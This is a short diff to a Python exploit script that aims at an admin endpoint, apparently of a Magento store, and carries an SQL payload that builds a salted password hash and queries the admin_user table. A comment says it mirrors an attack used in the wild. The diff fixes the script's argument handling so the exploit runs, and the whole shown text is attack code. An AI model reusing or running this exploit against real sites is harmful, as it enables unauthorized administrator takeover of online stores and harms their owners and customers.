@@ -2,7 +2,7 @@ import requests
 import base64
 import sys
 
-target = sys.argv[0]
+target = sys.argv[1]
 
 if not target.startswith("http"):
     target = "http://" + target
@@ -13,7 +13,7 @@ if target.endswith("/"):
 target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"
 
 # For demo purposes, I use the same attack as is being used in the wild
-query="""
+SQLQUERY="""
 SET @SALT = 'rp';
 SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
 SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
